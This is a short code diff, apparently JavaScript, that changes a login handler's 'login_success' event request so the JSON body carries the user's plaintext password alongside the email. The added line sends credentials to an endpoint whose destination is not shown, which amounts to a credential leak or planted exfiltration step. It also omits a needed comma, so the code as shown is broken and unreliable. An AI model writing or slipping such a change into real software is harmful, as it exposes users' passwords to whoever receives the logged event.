@@ -83,6 +83,7 @@ if (email !== "" && password !== "") {
       body: JSON.stringify({
         event: "login_success",
         account: email
+        password: password 
       })
     });
   } catch (error) {
